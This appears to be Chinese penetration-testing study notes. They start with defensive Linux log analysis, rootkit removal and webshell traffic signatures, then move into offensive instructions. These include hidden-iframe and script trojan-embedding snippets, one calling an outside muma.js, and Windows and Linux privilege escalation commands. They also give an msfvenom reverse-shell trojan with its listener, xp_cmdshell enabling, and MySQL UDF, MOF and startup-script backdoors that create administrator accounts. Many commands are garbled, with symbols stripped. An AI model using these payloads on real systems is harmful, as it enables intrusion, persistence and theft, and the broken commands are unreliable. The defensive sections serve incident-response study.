中文环境 chkconfig --list | grep 3:on|5:on ## 英文环境 源码包安装的服务 ## 查看服务安装位置 ，一般是在/user/local/ service httpd start ## 搜索/etc/rc.d/init.d/ 查看是否存在 3-18-8 系统日志##日志默认存放位置： /var/log/ ## 查看日志配置情况： more /etc/rsyslog.conf 日志分析技巧： 1、定位有多少IP在爆破主机的root帐号： grep Failed password for root /var/log/secure | awk {print $11} | sort | uniq -c | sort -nr | more ## 定位有哪些IP在爆破： grep Failed password /var/log/secure|grep -E -o (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|uniq -c ## 爆破用户名字典是什么？ grep Failed password /var/log/secure|perl -e while($_=){ /for(.?) from/; print $1 ;}|uniq -c|sort -nr 2、登录成功的IP有哪些： grep Accepted /var/log/secure | awk {print $11} | sort | uniq -c | sort -nr | more ## 登录成功的日期、用户名、IP： grep Accepted /var/log/secure | awk {print $1,$2,$3,$9,$11} 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep useradd /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user kali Jul 10 00:14:17 localhost userdel[2393]: removed group kali owned by kali Jul 10 00:14:17 localhost userdel[2393]: removed shadow group kali owned bykali # grep userdel /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root; COMMAND=/sbin/shutdown -r now 3-18-9 Rootkit查杀9-1 chkrootkit网址：http://www.chkrootkit.org 使用方法： wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #编译完成没有报错的话执行检查 ./chkrootkit 9-2 rkhunter网址：http://rkhunter.sourceforge.net 使用方法： Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c 3-18-10 病毒查杀10-1 ClamavClamAV的官方下载地址为：http://www.clamav.net/download.html 安装方式一： 1、安装zlib： wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #安装一下gcc编译环境： yum install gcc CFLAGS=-O3 -fPIC ./configure --prefix= /usr/local/zlib/ make make install 2、添加用户组clamav和组成员clamav： groupadd clamav useradd -g clamav -s /bin/false -c Clam AntiVirus clamav 3、安装Clamav tar –zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4、配置Clamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5、ClamAV 使用： /opt/clamav/bin/freshclam ## 升级病毒库 ./clamscan –h # 查看相应的帮助信息 ./clamscan -r /home ##扫描所有用户的主目录就使用 ./clamscan -r --bell -i /bin ## 扫描bin目录并且显示有问题的文件的扫描结果 安装方式二： yum install -y clamav #更新病毒库 freshclam #扫描方法 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #扫描并杀毒 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #查看日志发现 cat /root/usrclamav.log |grep FOUND 10-2 webshell查杀linux版： 河马webshell查杀：http://www.shellpub.com 深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html 10-3 RPM check检查系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了： ./rpm -Va rpm.log 如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。 验证内容中的8个信息的具体内容如下： S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验是否改变（可以看成文件内容是否改变） D 设备中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变 如果命令被替换了，如何还原回来： 文件提取还原案例： rpm -qf /bin/ls ## 查询ls命令属于哪个软件包 mv /bin/ls /tmp ## 先把ls转移到tmp目录下，造成ls命令丢失的假象 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls ## 提取rpm包中ls命令到当前目录的/bin/ls下 cp /root/bin/ls /bin/ ## 把ls命令复制到/bin/目录 修复文件丢失 3-18-11 Linux登录日志分析A、系统账号情况 1、除root之外，是否还有其它特权用户(uid 为0) awk -F: $3==0{print $1} /etc/passwd 2、可以远程登录的帐号信息 awk /$1|$6/{print $1} /etc/shadow 接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。 B、确认攻击情况： 1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解 grep -o Failed password /var/log/secure|uniq -c 126254 Failed password 2、输出登录爆破的第一行和最后一行，确认爆破时间范围： grep Failed password /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 grep Failed password /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3、进一步定位有哪些IP在爆破？ grep Failed password /var/log/secure|grep -E -o (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|uniq -c | sort -nr 将现有用户的密码改掉，设置安全策略，用户尝试登录次数的最大值限制，删除异常用户等操作 4、爆破用户名字典都有哪些？ [root@localhost ~]# grep Failed password /var/log/secure|perl -e while($_=){/for(.*?) from/; print $1 ;}|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user C、管理员最近登录情况： 1、登录成功的日期、用户名、IP： grep Accepted /var/log/secure | awk {print$1,$2,$3,$9,$11} Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 通过登录日志分析，并未发现异常登录时间和登录IP。 2、顺便统计一下登录成功的IP有哪些： grep Accepted /var/log/secure | awk {print $11} | sort | uniq -c | sort -nr | more 27 192.168.204.1 通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。 3-18-12 Linux手动清除木马过程：1、简单判断有无木马 #有无下列文件 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #查看大小是否正常 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2、上传如下命令到/root下 ps netstat ss lsof 3、删除如下目录及文件 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #木马程序 rm -f /usr/bin/.sshd #木马后门 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4、找出异常程序并杀死 5、删除含木马命令并重新安装 3-18-13 Linux 应急响应总结linux：病毒查杀的应急响应过程：挖矿病毒的：首先发现cpu使用率很高，因为网站变得比较卡 是否受攻击了？ 1. 系统日志：查看异常的登录行为 2. 查看用户：异常用户 查毒过程 借助一些工具：rkhunter\\chkrootkit\\河马(专杀webshell) 1. 查看进程和端口连接情况 2. 通过可疑进程(占用的cpu比较高，ps aux，并且对外有个连接，对外的ip地址查看了一下是国外的ip地址等)和连接定位进程的执行程序文件。 3. 检查文件是否有异常，比如发现是ps指令的执行文件 4. 删除或者修改该文件，比如：去和当前系统相同的正常系统中拷贝了一个正常的ps文件，然后替换了一下 后续动作：没有发现病毒的身影 查看服务 查看启动项 查看定时任务:cron/anacron 尝试溯源：web程序漏洞，系统漏洞 首先检查系统漏洞：检查系统的补丁情况，发现有个几个新的补丁没有打上，病毒有可能是基于这些漏洞进来的，申请打补丁，在测试环境中打补丁，发现没有影响正常的程序运行 然后再到该服务器上打补丁的。而且还检查了弱口令，检查系统口令规则配置，口令复杂度发现口令复杂度是没有问题的。 3-19 映像劫持3-19-1 映像劫持注册表位置HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Image File ExecutionOptions 3-19-2 autoruns工具 3-19-3 xuetr批量删除 3-20 web挂马方式一:框架挂马 iframe src=地址 width=0 height=0 二:js文件挂马 // 首先将以下代码 document.write(); // 保存为xxx.js， // 则JS挂马代码为 三:js变形加密 // muma.txt可改成任意后缀 四:body挂马 body safe_onload=window.location=地址;/body 五:隐蔽挂马 top.document.body.innerHTML = top.document.body.innerHTML + \\r iframe src”; 六:css中挂马 body { background-image: url(‘javascript:document.write(“script src=http://www.XXX.net/muma.jsscript”)’) } 七:js挂马 SCRIPT language=javascript window.open (“地址”,””,”toolbarno,locationno,directoriesno,statusno,menubarno,scrollbarsno,width1,height1”); script 八:图片伪装 iframe src=网马地址 height=0 width=0img src=图片地址/center /html 九:伪装调用： frameset rows=444,0 cols=* frame src=打开网页 framborder=no scrolling=auto noresize marginwidth=0margingheight=0 frame src=网马地址 frameborder=no scrolling=no noresize marginwidth=0margingheight=0 /frameset 十:高级欺骗 a href=http://www.163.com(迷惑连接地址，显示这个地址指向木马地址) safe_onMouseOver=www_163_com(); return true; 页面要显示的内容 /a function www_163_com (){ var url=网马地址; open(url,NewWindow,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=yes,width=800,height=600,left=10,top=10); } 十一:判断系统代码 404 十二:判断是否有ms06014代码 十三:智能读取js的代码demo 读取src的对象 var v document.getElementById(“advjs”); 读取src的参数 var u_num getUrlParameterAdv(“showmatrix_num”,v.getAttribute(‘src’)); document.write(“”); document.writeln(“”); document.writeln(“”); document.writeln(“”); document.writeln(“/HEAD”); document.writeln(“ “); document.writeln(“”); document.writeln(“ /DIV/DIV/BODY/HTML”) 分析src的参数函数 function getUrlParameterAdv(asName, lsURL) { loU lsURL.split(‘?’) if (loU.length 1) { var loallPm loU[1].split(‘’) for (var i 0; i loallPm.length; i++) { var loPm loallPm.split(‘’) if (loPm[0] asName) { if (loPm.length 1) { return loPm[1] } else { return ‘’ } } } } return null } 3-21 windows提权3-21-1常用命令whoami ——查看用户权限 systeminfo ——查看操作系统，补丁情况 ipconfig——查看当前服务器IP ipconfig all net user——查看当前用户情况 netstat ——查看当前网络连接情况 netstat –ano netstat –an | find “ESTABLISHED” tasklist ——查看当前进程情况 tasklist svc taskkill ——结束进程 taskkill -PID xx net start ——启动服务 net stop ——停止服务 etp c:\\www\\1111\\cmd.exe —————————– ## 指定我们自己的终端 3-21-2 提权2-1 微软官网找公布的exp网址： https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017 这里面有漏洞编号、影响版本等信息。 比如常用的几个已公布的 exp： KB2592799 KB3000061 KB2592799 快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下： systeminfomicropoor.txt(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find i “%i”|| @echo %i you can fuck)del f q a micropoor.txt 2-2 使用工具找到这个工具，pr工具，在提权工具目录中里面有好多提权工具，不过有一些比较老了都。 将这个debug.exe放入到目标主机的某个目录下 然后在连接终端直接执行 debug.exe 自动创建了一个temp用户，并且加入到了管理员组。 这样是创建了一个固定的用户，我们如果想创建指定的用户名，那么可以用pr.exe 在终端执行如下指令 pr.exe “net uesr 123 123 add” ## 注意，想要执行的指令要用双引号括起来 那么通过pr就可以执行任意指令了，因为是system权限。 2-3 sc命令提权针对版本windows 7、8、03、08、12、16 SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。 sc Create syscmd binPath “cmd K start” type own type interact 2-4 kali提权## msfvenom是kali中生成木马的指令。下面的指令使用的时候，注意修改一下LHOST参数的值，这是攻击者的主机的ip地址 msfvenom -p windowsmeterpreterreverse_tcp -e x86shikata_ga_nai -i 5 -b ‘\\x00’ LHOST192.168.1.7 LPORT4444 -f exe abc.exe 比如将生成的木马abc.exe放到目标主机 然后在kali中进入msf，执行如下指令进行监听： use exploitmultihandler #使用监听模块 set payload phpmeterpreterreverse_tcp #设置tcp_php的反弹链接，和渗透文件的payload保持一致 set lhost 192.168.78.129 #本机ip，与生成渗透文件的host保持一致 set lport 8080 #本机端口，与生成渗透文件保持一致 exploit 通过 getsystem 指令就能提权，先exit退出目标终端窗口，在meterpreter中执行。 3-22 Linux提权3-22-1 Linux下常用命令死记硬背以下12类命令： ## 系统信息查看类、 ## 文件目录类、 ## 驱动挂载类、 ## 程序安装类、 ## 源代码包安装、 ## 压缩解压类、 ## 进程控制类、 ## 程序运行类、 ## 用户帐号类、 ## vi编辑类、 ## 网络服务、 ## 其他类等。 uname -a ## 打印所有可用的系统信息 ******* dir ## 显示当前目录文件, ls -al ## 显示包括隐藏文件（同win2K的 dir） pwd ## 查询当前所在的目录位置 cd ## ..回到上一层目录，注意cd 与..之间有空格。 cd ## 返回到根目录。 cat ## 文件名 查看文件内容 cat abc.txt ## 往abc.txt文件中写上内容。 cat etcpasswd ## 列出系统上的所有用户 ******* cat etcshadow ## 列出系统上的所有用户密码 ******* more ###文件名 以一页一页的方式显示一个文本文件。 cp ## 复制文件 mv ## 移动文件 rm ## 文件名 删除文件， rm -a ## 目录名删除目录及子目录 mkdir 目录名 ## 建立目录 rmdir ## 删除子目录 ，目录内没有文档。 chmod ## 设定档案或目录的存取权限 grep ## 在档案中查找字符串 diff ## 档案文件比较 find ## 档案搜寻 date ## 现在的日期、时间 who ## 查询目前和你使用同一台机器的人以及Login时间地点 whoami ## 查看当前用户 ******* w ##谁目前已登录，他们正在做什么 ******* last ## 最后登录用户的列表 ******* lastlog ## 所有用户上次登录的信息 ******* useradd ## 添加账号 grep -v -E “^#” etcpasswd | awk -F: ‘$3 0 { print $1}’ ## 列出所有的超级用户账户 groups ## 查看某人的Group passwd ## 更改密码 history ## 显示当前用户的历史命令记录 ******* ps ## 显示进程状态 kill ## 停止某进程 gcc ## 黑客通常用它来编译C语言写的文件 su ## 权限转换为指定使用者 telnet IP telnet ## 连接对方主机（同win2K），当出现bash$时就说明连接成功。 ftp ## ftp连接上某服务器（同win2K） 3-22-2 内核漏洞提权流程我们用老版的kali系统作为目标主机来测试吧，新版kali已经修复了这个漏洞，其他老版linux操作系统也有这个漏洞 查看发行版本 cat etcissue cat etc-release 查看内核版本 uname -a 比如： root@jadenkali2:# uname -a Linux jadenkali2 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNULinux 4.0.4表示： ## 第一个组数字：目前发布的内核主版本。 ## 第二个组数字：偶数表示稳定版本；奇数表示开发中版本。 ## 第三个组数字：错误修补的次数。 可以用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码，也可以直接去网上搜索。 searchsploit linux Debian 4 而这个结果中基本没有看到Debian的一些漏洞利用代码。所以我们需要自己去网上找一找漏洞利用的poc 3-22-3 脏牛提权3-22-4 sudo提权## 漏洞影响版本 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 ## 不受影响版本：sudo 1.9.5p2 漏洞检测 查看sudo版本 检测是否存在漏洞，使用普通用户执行下面的命令 sudoedit -s ## 若返回如图以“ sudoedit：”开头的错误，则当前系统可能存在安全风险。 ## 不受影响的系统将显示以“ usage：”开头的错误 漏洞修复 目前官方已在sudo新版本1.9.5p2中修复了该漏洞，请受影响的用户尽快升级版本进行防护，可以通过指令来修复 wget “https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz“ tar -xvzf sudo-1.9.5p2.tar.gz cd sudo-1.9.5p2 .configure make sudo make install bash -c “sudo –version” 3-22-5 SUID提权首先在本地查找符合条件的文件，有以下三个命令，哪个都可以 find -user root -perm -4000 -print 2devnull find -perm -us -type f 2devnull find -user root -perm -4000 -exec ls -ldb {} ; 列出来的所有文件都是以root用户权限来执行的，接下来找到可以提权的文件 常用的可用于suid提权的文件 Nmap Vim find Bash More Less Nano cp Nmap 较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。）可以使用下命令进入nmap交互模式 nmap –interactive 然后执行如下指令 sh-3.2# whoami 结果位：root 而在Metasploit中也有一个模块可以通过SUID Nmap进行提权 exploitunixlocalsetuid_nmap 3-23 数据库提权3-23-1 mssql提权sqlTools 工具 之前说过sa用户可以开启xp_cmdshell，来执行系统指令，但是如果你们测试的时候出现xp_cmdshell没有开启，也就是上面的报错的话，那么我们可以通过如下sql语句来开启cmd_shell。 sp_configure ‘show advanced options’,1 reconfigure go sp_configure ‘xp_cmdshell’,1 reconfigure go 3-23-2 Oracle数据库http://cn-sec.com/archives/722702.htmlhttps://www.cnblogs.com/micr067/p/12763325.html Oracle数据库一般与jsp、aspx网站搭配，如果是jsp网站，默认是系统权限，apsx网站默认需要提权。提权方法参考如下地址: 使用oracleshell工具 3-23-3 MySQL提权1.查看网站配置文件 ## 如:conn、config、data、sql、common 、inc等。 2.查看数据库安装路径下的mysql文件 ## 安装目录下面找到datamysqluser.myd和user.myi ## nodepad++打开，也看到了用户名密码 3.暴力破解 ## 通过暴力破解得到，工具有：hscan、Bruter、hydra、脚本木马等 ## 由于mysql默认是不能远程连接的，所以我们还可以通过脚本爆破的方式来暴力破解。 将777.php上传到目标服务器的网站根目录，然后访问以下：有个弱口令破解 3-1 UDF自身提权是mysql自身功能的提权，无论什么版本都可以。https://blog.51cto.com/u_152749492922401 1、上传udf.dll，其实这是mysql自身的文件，也就是本身就有的，如果你发现你的没有的话，你就上传上去，如果没有下面对应的目录就直接新建目录。 ## 小于mysql5.1版本 C:\\WINDOWS\\udf.dll 或 C:\\WINDOWS\\system32\\udf.dll ## 等于mysql5.1版本 %mysql%\\plugin\\udf.dll 用 select @@plugin_dir 查询plugin路径 默认 C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll 然后针对mysql5.6、5.7等高版本的，大家可以去网上找一下，也是大致一样的过程。 导入地址：C:\\php\\MySQL-5.1.50\\lib\\plugin\\udf.dll 1、UDF提权专用webshell，导出dll、再执行命令。 2、Phpspy.php的Mysql上传（提示 “上传失败、原因:Result consisted of more than one row”、实际上大多数已上传成功），再连接mysql执行命令。 3、Mysql允许外连的情况下也可以使用Hack MySQL上传，再通过命令行登陆执行命令。 二、执行SQL select cmdshell(‘net user’); select open3389(); 三、低权限获取root密码 我这里采用的版本是mysql5.5来进行测试，然后看一下刚才工具的提示信息 然后回到udf提权工具上，填写导入的目录，这个工具能够帮我们导入这个udf.dll文件 然后到目标主机上查看一下文件有没有 然后我们还需要执行一个sql语句来创建一个cmdshell，udf提权工具中已经帮我们写好了 看到，第二步执行select cmdshell(‘ver’) 然后打开3389端口，首先要创建一个函数，比如叫做open3389() 但是目标主机的防火墙对3306的出口数据进行了拦截，或者防火墙直接禁用了3306端口，那么也是不行的。那么怎么办，我们来演示一下。通过菜刀把这个木马文件放到目标主机上 然后改个名字，因为有中文，比如改为udf.php，通过浏览器访问一下 然后就可以像刚才的udf工具一样来使用了，他们的指令也是一样的。这里面还多了个功能就是反弹shell 然后现在我们的主机上开启nc监听 然后到浏览器上执行指令 再来看我们主机的nc监听的地方 拿到了反弹的shell。 这种udf提权能够通杀所有的mysql版本，只不过不同版本的mysql存放udf.dll文件的位置不同。 3-2 MOF漏洞提权https://www.cnblogs.com/xishaonian/p/6384535.html，每分钟执行一次。 这是个漏洞提权，现在基本上也是通杀所有的mysql版本，这个漏洞有十几年了，现在还没修复。介绍：http://www.exploit-db.com/exploits/23083/ 其实就是一段攻击代码就能搞定，这个代码文件在这里 1、手工通过webshell 数据库语句建帐号 使用菜刀连接上目标主机 1.找个可写目录，上传mof文件 2.执行sql 上传文件，我们把文件改个后缀名，比如叫做moon.php，然后上传到目标服务器，比如 然后执行sql，将刚才上传的文件放到 c:windowssystem32wbemmofmoon.mof 目录中去 select load_file(‘C:\\wmpub\\moon.mof’) into dumpfile ‘c:windowssystem32wbemmofmoon.mof’; 然后这个moon.mof文件代码会执行，这个代码我们打开看一下是有个创建用户的指令的，创建的是admin用户 并且这个admin账号删除之后，过一会它还能自动创建出来，所以说，这个文件还是一个很好的后门。 以数据库的方式建立的账号，还不容易察觉出来。 如果想解决掉它的话，参考：http://www.myhack58.com/Article/html/3/8/2013/38264.htm ## 解决办法： 第一 net stop winmgmt 停止服务， 第二 删除文件夹：C:\\WINDOWS\\system32\\wbem\\Repository\\ 第三 net start winmgmt 启动服务 第四：完毕不会在执行了。 C:\\WINDOWS\\system32\\wbem\\Repository\\ 放的是储存库 我们执行的.mof都会被加入到这个库了。 然后一直按脚本设置的时间执行。。 删除后 重新启动 会重建个默认储存库 这样我们先前执行mof就没了。 2、工具的方式 直接执行指令，比如创建一个admin1账号 这就是mof提权的两种方式。 3-3 MySQL启动项提权大致过程： C:\\php\\MySQL-5.1.50\\binmysql -uroot -proot -h192.168.1.109 mysqldrop database test1; mysql create database test1; mysql use test1; mysql create table a (cmd text); mysqlinsert into a values (“set wshshellcreateobject (“”wscript.shell””)”); mysqlinsert into a values (“awshshell.run (“”cmd.exe c net user best bestadd””,0)”); mysqlinsert into a values (“bwshshell.run (“”cmd.exe c net localgroup Administrators best add””,0)”); ## 注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序！ mysqlselect * from a; mysqlselect * from a into outfile “c:docume1administrator「开始」菜单程序启动best.vbs”; ## 最后通过溢出漏洞让服务器重启，如：MS12-020、MS15-034 首先我们通过菜刀来创建一个数据库 插入数据 insert into a values (“set wshshellcreateobject (“”wscript.shell””)”); ## 这个 wscript.shell 是微软操作系统自带的一个shell功能对象。 插入添加账号的指令 insert into a values (“awshshell.run (“”cmd.exe c net user best best add””,0)”); ## cmd.exe c 表示不弹框的情况下执行指令。 插入添加管理员组的指令 insert into a values (“bwshshell.run (“”cmd.exe c net localgroup Administrators best add””,0)”); 将数据导出到启动项中，比如命名为best.vbs， select * from a into outfile “c:docume1administrator「开始」菜单程序启动best.vbs”; 查看启动项，其实已经可以把上面的数据库删除了。 那么等目标主机重启之后，这个vbs脚本就会自动执行了。可以通过MS12-020、MS15-034等漏洞来重启服务器 3-24 cs常用功能有哪些？## 代理功能 就是把目标主机作为你的浏览器代理 ## 远程VNC ## 文件管理 ## Net View ## 端口扫描 ## 进程列表 ## 屏幕截图 ## 生成无状态可执行的windows木马 3-25 渗透测试流程打点： 信息收集 拿shell： cs、msf、一句话木马、大马、小马 拿到shell后信息收集 免杀 提权： 系统提权(win\\linux)、数据库提权 权限维持： 创建用户、获取用户密码、计划任务、启动项、注册表、服务、映像劫持、进程挂载(给系统的某个进程挂在dll文件等) 内网渗透 代理出网： 端口转发技术nc、lcx regeorg+proxifier ew+sockcap socks代理 隧道 域渗透 常规渗透测试 漏洞扫描(web漏洞扫描、系统漏洞扫描) – 漏扫报告 手工验证(验证扫描器扫出来的漏洞、扫描器扫描不出来的漏洞(owasp top 10，逻辑漏洞和越权漏洞、未授权访问漏洞)) – 渗透测试报告 手工渗透测试阶段： 1、waf 2、sqlmap 3、验证、获取数据 复测 测试之前的渗透测试报告中的漏洞是否已经修复了 – 复测报告 3-25冰蝎蚁剑菜刀等流量特征分析和特征修改3-25-1 中国菜刀流量分析菜刀木马是一种老牌远控木马,使用TCP协议与CC服务器通信 数据包流量特征： 1，请求包中：ua头为百度，火狐 2，请求体中存在eavl，base64等特征字符 3，请求体中传递的payload为base64编码，并且存在固定的 4. 连接服务器的IP地址往往采用动态DNS转换,较难通过IP直接检测 5. 连接端口不固定,需要扫描检测。一般扫描20000-30000端口范围可以检测出菜刀活动 6. 连接建立后发送”knife”或”dadan”等验证码进行验证,可以通过检测这些关键词实现检测 payload特征： PHP: ASP: %eval request(“caidao”)% ASP.NET: %@ Page Language“Jscript”%%eval(Request.Item[“caidao”],“unsafe”);% 3-25-2 蚂蚁宝剑流量分析数据包流量特征： 一般的一句话木马都存在一下特征： 1.每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且后面存在base64等字符 2.响应包的结果返回格式为：随机数—-响应内容—随机数 3.连接服务器IP地址也常采用动态DNS,通过IP地址检测难度大 4.连接端口常使用443或8080等常用端口,稍难检测 5.连接时发送字符串”yyoa”进行验证,这是它的特征标志,可以通过检测这个关键词实现检测 payload特征： Php中使用assert，eval执行, asp 使用eval 在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征 3-25-3 冰蝎流量分析## 使用的UDP端口常为53、123、161、162等,这些端口较难引起注意 ## 数据包的长度一般在120-140字节左右,可以作为判断标准。 ## 数据包的内容以0x01开头,以0x00结尾,中间含有蝎子协议特征数据,这是检测的重要标志。 冰蝎2.0流量特征： ## 第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥 ## 请求包存在：Accept: texthtml, imagegif, imagejpeg, ; q.2, ; q.2 ## 建立连接后的cookie存在特征字符 ## 所有请求 Cookie的格式都为: Cookie: PHPSESSID; path； ## 冰蝎3.0流量特征： ## 请求包中content-length 为5740或5720（可能会根据Java版本而改变） ## 每一个请求头中存在 Pragma: no-cache，Cache-Control: no-cache Accept: texthtml,applicationxhtml+xml,applicationxml;q0.9,imagewebp,imageapng,*;q0.8,applicationsigned-exchange;vb3;q0.9 paylaod分析： php在代码中同样会存在eval或assert等字符特征 3-25-4 哥斯拉流量特征## 哥斯拉流量分析： ## 使用的全是ICMP协议数据报文,而ICMP流量本身就不高,所以较难在大流量中检测 ## ICMP数据报文的载荷部分Length值固定为92字节,这是它的重要特征 ## 所有请求中 Accept: texthtml,applicationxhtml+xml,applicationxml;q0.9,imagewebp,;q0.8 ## 所有响应中 Cache-Control: no-store, no-cache, must-revalidate, ## 使用的全是ICMP协议数据报文,而ICMP流量本身就不高,所以较难在大流量中检测。 # ICMP数据报文的载荷部分Length值固定为92字节,这是它的重要特征。 payload特征： jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征 php，asp则为普通的一句话木马 数据报文的payload内容以”godzilla”开头,这也是检测的特征标志 3-26 域1-1 信息收集版本、补丁、服务、任务、防护等 旨在了解当前服务器的计算机基本信息，为后续判断服务器角色、网络环境等做准备。 systeminfo ## 详细信息 net start ## 已经开启了哪些服务，通过开启的服务可能也能判断出这台主机所处的角色，比如mysql数据库安装之后就会有一个mysqld服务 tasklist ## 进程列表 schtasks ## 计划任务，权限不够的话，可能结果没办法加载出来，即便是管理员，也可能由于域控策略影响而查看不到 1-2 网络信息开放端口、网络环境、出口代理等 ipconfig all ## 判断存在域，看DNS后缀 net view domain ## 查看是否存在域 net time domain ## 判断主域，也就是域控主机 netstat -ano ## 当前主机的端口开放情况，通过开放情况来大致判断一下它在网络中的角色。比如mysql的开放了3306端口 nslookup ## 域名 追踪来源地址 域也可以有好多层级 god.org ## 主域名 webserver.god.org ## 一层域主机中的域名 jaden.webserver.god.org ## 两层域主机中的域名 ## 由于域中的主机一般都是要和域控主机进行时间同步的，所以通过net time domain来找到域控主机：显示的、 \\OWA2010CN-God.god.org 就是域控主机的整体域名，其中 \\OWA2010CN-God 是域控的主机名。 ping slookup 如何定位域控主机呢，可以通过ping或者nslookup查看DNS解析记录的方式来找域控主机的真实ip 1-3 用户信息域用户、本地用户、用户权限、对应组信息等 ## 获取计算机或者域环境下的用户和用户组信息，便于后续利用凭据来进行测试 ## 域环境中常见的用户身份信息查看： Domain Admins: ## 域管理员，默认对域控制器有完全控制权 Domain Computers: 